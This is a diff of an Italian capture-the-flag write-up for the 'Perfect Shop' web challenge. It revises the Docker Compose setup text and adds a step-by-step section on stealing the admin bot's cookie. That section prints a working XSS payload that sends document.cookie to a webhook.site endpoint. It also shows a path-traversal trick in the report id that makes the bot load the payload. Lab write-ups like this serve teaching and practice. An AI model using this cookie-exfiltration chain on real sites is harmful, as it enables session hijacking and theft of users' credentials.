@@ -302,28 +302,28 @@ Una volta fatto questo, vengono gestiti vari casi d'errore e di successo. Verran
 Quello che sta succedendo in breve è che il report dell'utente sta venendo verificato da un bot, che simulerà il comportamento di un admin loggato che presumibilmente ha dei cookie di sessione/autenticazione relativi allo Shop e che controllerà il prodotto con l'id indicato dall'utente nel momento del report.
 
 ## Setup
-Avere la challenge che runna in locale facilita di molto il processo di understanding del funzionamento di ogni minima parte dell'applicazione che si sta per attaccare. In questo caso gli organizzatori hanno anche delivered il codice sorgente con dei `docker-compose` file che permettono di setuppare l'infrastruttura in un attimo.
+Avere la challenge che runna in locale facilita di molto il processo di understanding del funzionamento di ogni minima parte dell'applicazione che si sta per attaccare. In questo caso gli organizzatori hanno anche delivered il codice sorgente con dei `docker compose` file che permettono di setuppare l'infrastruttura in un attimo.
 
 ##### Docker
 [Docker](https://www.docker.com/) consente di creare "scatole magiche" (container) che contengono un certo software che può venire eseguito come se si trovasse sull'elaboratore di chi l'ha progettata.
 
 Questo significa che il programmatore può permettersi di distribuire infrastrutture che si basano su sistema operativi e configurazioni particolari, senza che l'utente sia costretto a passare a suddetto OS o a modificare le sue configurazioni.
 
-##### Docker-Compose
+##### docker Compose
 Un'applicazione potrebbe aver bisogno di più container, immaginiamo un sito con un server dedicato per il web engine e uno per il database (come in questa challenge). 
 
-I file [Docker-Compose](https://docs.docker.com/compose/) sono simili a una mappa che aiuta nella gestione coordinata di diversi container concettualmente legati. Viene specificato quali container devono essere avviati nello stesso momento con un singolo comando, e le informazioni ad essi relativi, come il valore delle loro variabili d'ambiente, le porte che possono utilizzare, le loro dipendenze, etc.
+I file [docker Compose](https://docs.docker.com/compose/) sono simili a una mappa che aiuta nella gestione coordinata di diversi container concettualmente legati. Viene specificato quali container devono essere avviati nello stesso momento con un singolo comando, e le informazioni ad essi relativi, come il valore delle loro variabili d'ambiente, le porte che possono utilizzare, le loro dipendenze, etc.
 
-Ricevere in allegato al codice sorgente della challenge anche un docker-compose ben fatto, significa poter testare in locale con un solo comando, e poter modificare il codice a proprio piacimento per comprendere meglio i limiti dei nostri payload e la natura delle vulnerabilità del sito che si sta attaccando.
+Ricevere in allegato al codice sorgente della challenge anche un docker compose ben fatto, significa poter testare in locale con un solo comando, e poter modificare il codice a proprio piacimento per comprendere meglio i limiti dei nostri payload e la natura delle vulnerabilità del sito che si sta attaccando.
 
 ### Questa challenge
 #### Linux
-Per runnare semplicemente la challenge, basta eseguire un `sudo docker-compose up` nella cartella della challenge per far runnare tutti i container. Come è possibile vedere sia dal `server.js` che dal `docker-compose.yaml`, il sito sarà raggiungibile sulla [porta](https://en.wikipedia.org/wiki/Port_(computer_networking)) 3000.
+Per runnare semplicemente la challenge, basta eseguire un `sudo docker compose up` nella cartella della challenge per far runnare tutti i container. Come è possibile vedere sia dal `server.js` che dal `docker compose.yaml`, il sito sarà raggiungibile sulla [porta](https://en.wikipedia.org/wiki/Port_(computer_networking)) 3000.
 
-Se per qualche motivo si volesse modificare il codice sorgente della challenge, basta effettuale le modifiche desiderate, salvare il file, e runnare `sudo docker-compose build web`. In questo caso, con `web` stiamo stiamo specificando che non vogliamo rebuildare tutti i container, ma solo quello relativo al server web.
+Se per qualche motivo si volesse modificare il codice sorgente della challenge, basta effettuale le modifiche desiderate, salvare il file, e runnare `sudo docker compose build web`. In questo caso, con `web` stiamo stiamo specificando che non vogliamo rebuildare tutti i container, ma solo quello relativo al server web.
 
 #### Windows
-Startare il Docker Engine. Se si ha docker desktop, basta avviarlo ed insiemo ad esso si avvierà anche l'engine. Da terminale, accedere alla cartella del Perfect Shop e lanciare `docker-compose up` per avviare la challenge in locale, e `docker-compose build web` in caso si volessero applicare delle modifiche. In questo caso, con `web` stiamo stiamo specificando che non vogliamo rebuildare tutti i container, ma solo quello relativo al server web.
+Startare il Docker Engine. Se si ha docker desktop, basta avviarlo ed insiemo ad esso si avvierà anche l'engine. Da terminale, accedere alla cartella del Perfect Shop e lanciare `docker compose up` per avviare la challenge in locale, e `docker compose build web` in caso si volessero applicare delle modifiche. In questo caso, con `web` stiamo stiamo specificando che non vogliamo rebuildare tutti i container, ma solo quello relativo al server web.
 
 ## How to attack?
 La presenza di un bot dà di fatto la certezza che ci sarà da sfruttare una [client-side vulnerability](https://owasp.org/www-project-top-10-client-side-security-risks/), cosa palesemente confermata dalla presenza di un filtro per le XSS.
@@ -411,3 +411,64 @@ Ho deciso di mantenere una decenza sul filtro di lunghezza per evitare di ritrov
 
 A questo punto non resta che buildare e uppare la challenge, e vedere come va.
 
+![Esempio di injection di una semplice XSS con i filtri disattivati nella challenge](./media/vid/FirstXSS.gif)
+
+Come ci si poteva aspettare, con i filtri disattivati ci si riesce a pwnare regolarmente. Ed a rubare un cookie?
+
+##### Cookie stealing e webhooks
+I cookie sono un tipo di header speciale, e per questo esiste una sorta di shortcut in javascript che permette di accedervi, ovvero la proprietà `document.cookie`. 
+
+Per riuscire ad esfiltrare i cookie di un utente sul sito, si ha bisogno di un endpoint che sia raggiungibile dalla vittima, il che significa che bisogna esporre un server per fare in modo che sia raggiungibile da chiunque. 
+
+I [webhook](https://en.wikipedia.org/wiki/Webhook) sono... cose... molto versatili. Per quel che riguarda questa challenge, un sito come [webhook.site](https://webhook.site/) permette di utilizzarli come se si stesse utilizzando un proprio server esposto al mondo esterno.
+
+Per fare una prova, si può utilizzare un payload di questo tipo. `<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>`
+
+In questo tipo di payload è importante non utilizzare un tag HTML, ma assicurarsi che stia venendo effettivamente eseguito del codice javascript (va bene inserire l'URL al webhook concatenato con `document.cookie` dentro ad un `onerror`, ma non in una semplice `src`) in modo che document.cookie sia "raggiungibile".
+
+Inoltre, bisogna appendere i cookie come query parameter (webhook e server personale) o come path (solo server personale). Non farlo significa appendere i cookie come parte dell'host, il che significa che la richiesta non raggiungerà mai la destinazione desiderata. Per esempio, invece di finire su `myhost.com`, finirebbe su `myhost.comCOOKIENAME=COOKIEVALUE`, che non ha senso, al contrario di `myhost.com?c=COOKIENAME=COOKIEVALUE` o `myhost.com/COOKIENAME=COOKIEVALUE` (che con `webhook,site` non ha senso, a meno che non si sia proprietari di suddetto dominio).
+
+Eseguendo il payload poco sopra inviandolo nella pagina di ricerca, si ottiene il risultato seguente su webhook.site:
+
+![Esempio risultato webhook](./media/img/FirstWebhook.png)
+
+Ecco i cookies!
+
+#### Secondo passo: Cookie stealing al bot
+Forse avrebbe avuto più senso trovare prima un payload valido con il filtro di caratteri, ma in gara ero un po' nel panico e volevo essere sicuro di poter rubare i cookie al bot senza problemi. Paura immotivata, visto che non c'era alcun tipo di controllo in questo senso e non veniva specificato il valore di [`httpOnly`](https://owasp.org/www-community/HttpOnly) per il cookie `flag`, che verrà quindi settato come da default value a `false`.
+
+*che significa?* Per motivi di sicurezza è stata introdotta la flag opzionale `httpOnly` per il cookie, che se settata a `true` non permette al codice javascript presente nel documento di accedere a `document.cookie`, mitigando esattamente il tipo di attacco che sto per effettuare.
+
+Ma prima, c'è da approfondire il funzionamento del bot e della relativa pagina di report.
+
+![Ispezione network di una POST all'endpoint di reporting](./media/img/NetworkReport.png)
+
+Tutto regolare, ecco l'id e il messaggio. Andando nei log, che appaiono sul terminale dal quale si è lanciato il `docker compose`, è anche possibile verificare quale pagina è stata visitata dal bot:
+
+![Esempio di log che indicano che il bot ha visitato la pagina relativa al prodotto segnalato](./media/img/BotVisitsProduct.png)
+
+E se, per nessun motivo, si volesse mandare un id diverso da quelli prefissati dalla `select` proposta dal programmatore? In questo caso, è molto utile modificare la richiesta con Burp Suite o strumenti simili. Per sfortuna non ho il tempo materiale di mostrare come setuppare Burp sul vostro browser di fiducia ([questo](https://www.youtube.com/watch?v=Vn_Zst6BMGo) tutorial può tornare utile) o per mostrare il procedimento per risolvere la challenge senza l'utilizzo di strumenti simili.
+
+![Modifica dell'ID del prodotto da Burp](./media/vid/BurpIDmodif.gif)
+
+Ciò che ho fatto, è modificare il valore di `id` da `1` a `1/../../search?q=Incredible` prima che venisse inviato al server e conseguentemente al bot. Per capirci, avrei ottenuto lo stesso risultato se avessi fatto questo:
+
+![Modifica dell'ID del prodotto dall'HTML client-side](./media/img/HTMLmodif.png)
+
+Andando nei logs, è possibile vedere che il bot viene redirectato a `search?q=Incredible`:
+
+![Log del bot che visita la pagina di ricerca col valore inserito da chi effettua il report](./media/img/BotFallsForIt.png)
+
+Basta fare un breve controllo della struttura delle route del sito per convincersene.
+
+Ora non resta che provare il payload che ha funzionato prima per esfiltrare il nostro cookie sul bot. Provando appunto il payload `<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>`, si noterebbe che l'URL completo che si visita è `http://localhost:3000/search?q=<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>` o `http://perfectshop.challs.open.ecsc2024.it/search?q=<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>` a seconda se si sta provando la challenge in locale o sul server di gara.
+
+Questo significa che si dovrà far effettuare la stessa richiesta dal bot, il che significa effettuare la stessa modifica che si è fatta prima, fondendola con l'exploit che si è già usato:
+
+![Esempio di attacco funzionante senza filtro](./media/img/WePwnNoFilter.png)
+
+Ovviamente io non sto URL-encodando il payload col solo scopo di far capire meglio cosa sta succedendo, ma voi spettatori da casa dovete ricordarvi di URL-ecodare come si deve <3 (su Burp CTRL+U evidenziando il testo da URL-encodare):
+
+![Esempio di prima ma URL-encodato](./media/vid/UrlEncoding4profit.gif)
+
+Prima una URL encodata per il valore del query parameter che il bot invierà all'endpoint di ricerca, e poi una URL-encodata per tutto il payload che sta per venire inviato al bot.
